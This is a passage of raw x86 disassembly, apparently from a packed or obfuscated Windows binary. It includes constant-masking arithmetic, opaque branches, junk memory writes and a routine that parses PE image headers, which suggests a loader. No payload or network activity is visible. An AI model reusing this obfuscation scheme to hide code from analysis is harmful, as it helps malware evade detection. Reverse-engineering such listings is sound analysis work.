  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
